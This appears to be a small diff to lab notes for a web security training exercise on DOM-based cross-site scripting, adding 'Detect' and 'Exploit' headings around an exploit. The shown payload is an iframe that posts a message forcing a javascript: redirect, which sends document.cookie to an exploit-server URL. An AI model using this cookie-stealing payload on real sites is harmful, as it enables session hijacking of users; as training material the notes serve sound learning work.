@@ -34,6 +34,7 @@
 
 
 # DOM Based XSS
+## Detect:
 ```
 GET /
 
@@ -64,6 +65,7 @@ GET /
     }, false);
 </script>
 ```
+## Exploit:
 ```
 <iframe src=https://LAB.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"redirect\",\"redirectUrl\":\"javascript:window.location=%22https://EXPLOIT-SERVER-URL-XX.web-securityacademy.net/?c=%22%2bdocument.cookie\"}","*")' >
 ```
